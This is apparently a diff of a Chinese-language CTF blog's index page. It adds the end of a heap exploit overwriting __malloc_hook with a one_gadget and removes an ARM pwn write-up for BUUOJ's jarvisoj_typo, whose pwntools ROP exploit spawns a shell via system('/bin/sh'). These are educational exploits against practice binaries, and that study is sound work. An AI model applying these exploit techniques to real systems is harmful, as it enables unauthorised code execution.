p64(<span class="number">0x20</span>) + p64(<span class="number">0x71</span>) + p64(__malloc_hook - <span class="number">0x23</span>)).ljust(<span class="number">0x88</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">create_note(<span class="number">0x68</span>)   <span class="comment"># chunk_info #5</span></span><br><span class="line">create_note(<span class="number">0x68</span>)   <span class="comment"># chunk_info #8, to __malloc_hook</span></span><br><span class="line">write_note(<span class="number">8</span>, <span class="number">0x13</span> + <span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0xB</span> + p64(base + one_gadgets[<span class="number">3</span>]) + p64(realloc + <span class="number">4</span>))</span><br><span class="line">create_note(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-7/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1380,120 +1508,6 @@ exp：</p>
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="CoLin">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CoLin's BLOG">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-2/" class="post-title-link" itemprop="url">ARM pwn 入门 (2)</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-02-28 22:01:00" itemprop="dateCreated datePublished" datetime="2023-02-28T22:01:00+08:00">2023-02-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-03-01 11:30:21" itemprop="dateModified" datetime="2023-03-01T11:30:21+08:00">2023-03-01</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ARM-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">ARM pwn 系列</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>1.1k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>1 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><font face=汉仪唐美人>上一篇文章中笔者对ARM架构的寄存器和指令集做了简单的介绍，本文就来首杀ARM pwn题。</font></p>
-<h1 id="font-size6-face汉仪唐美人buuoj-第139题-jarvisoj_typofont"><a class="markdownIt-Anchor" href="#font-size6-face汉仪唐美人buuoj-第139题-jarvisoj_typofont"></a> <font size=6, face=汉仪唐美人><strong>buuoj 第139题 jarvisoj_typo</strong></font></h1>
-<p><font face=汉仪唐美人>这一题是静态编译的程序，对于ARM可执行文件，在x86架构的虚拟机上可以使用<code>qemu-arm ...</code>来执行。</font></p>
-<p><font face=汉仪唐美人>我们首先来执行看一下这个程序有什么输出。</font></p>
-<p><img src="1.png" alt="" /></p>
-<p><font face=汉仪唐美人>在程序一开始输出了一段字符串，我们可以在IDA中用Shift+F12来查看elf文件中所有硬编码的字符串：</font></p>
-<p><img src="2.png" alt="" /></p>
-<p><font face=汉仪唐美人>然后根据交叉引用找到该字符串被引用的位置：</font></p>
-<p><img src="3.png" alt="" /></p>
-<p><font face=汉仪唐美人>根据程序的输入，我们可以猜测出其中一部分库函数，如这里的write、getchar等。看上去这是一个正常的输入程序，一个typing test，如果输入的内容和程序输出相同就会继续输出一个单词等待用户输入，否则输出error。</font></p>
-<p><img src="4.png" alt="" /></p>
-<p><font face=汉仪唐美人>这里可以推测<code>sub_8D24</code>是关键输入函数。</font></p>
-<p><img src="5.png" alt="" /></p>
-<p><font face=汉仪唐美人>这里的input应该就是输入的缓冲区，我们需要进行调试确定到底是哪一步执行了读取用户输入的操作：qemu-arm后加-g选项指定端口，就可以通过<code>gdb-multiarch</code>进行调试。经过调试发现上图中的<code>read</code>函数就是读取的函数，且最大读取大小为512字节，这明显就造成了栈溢出。</font></p>
-<p><img src="6.png" alt="" /></p>
-<p><font face=汉仪唐美人>从上图可知，覆盖返回地址需要先输入0x70字节。在elf文件中可以发现字符串<code>/bin/sh</code>:</font></p>
-<p><img src="7.png" alt="" /></p>
-<p><font face=汉仪唐美人>引用字符串<code>/bin/sh</code>的函数就是<code>system</code>函数。因此我们可以找到<code>system</code>函数的地址为0x10BA8。需要注意ARM架构函数的调用约定：<font color=red>前4个参数保存在R0~R3，之后的参数从右至左压栈。因此要想执行<code>system(&quot;/bin/sh&quot;)</code>，就需要将寄存器R0的值修改为字符串<code>'/bin/sh'</code>的地址，返回地址可以通过栈溢出直接修改。考虑到这是一个静态编译的文件，很容易就可以想到使用一个简单的ROP来实现寄存器修改操作。<font></font></p>
-<p><img src="8.png" alt="" /></p>
-<p><font face=汉仪唐美人>找到合适的ROP地址为0x20904，可以在修改寄存器R0的值之后修改PC的值。现在可以编写exp了。</font></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;./typo&#x27;</span>])</span><br><span class="line">io.sendafter(<span class="string">b&#x27;quit\n&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">io.send(cyclic(<span class="number">0x70</span>) + p32(<span class="number">0x20904</span>) + p32(<span class="number">0x6c384</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x10ba8</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<p><img src="9.png" alt="" /></p>
-<p><font face=汉仪唐美人>成功getshell。这题看来不难，只是一个简单的不能再简单的ROP。</font></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1563,7 +1577,7 @@ exp：</p>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">141</span>
+          <span class="site-state-item-count">142</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1621,7 +1635,7 @@ exp：</p>
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
-    <span title="Reading time total">18:57</span>
+    <span title="Reading time total">19:07</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
   </div>
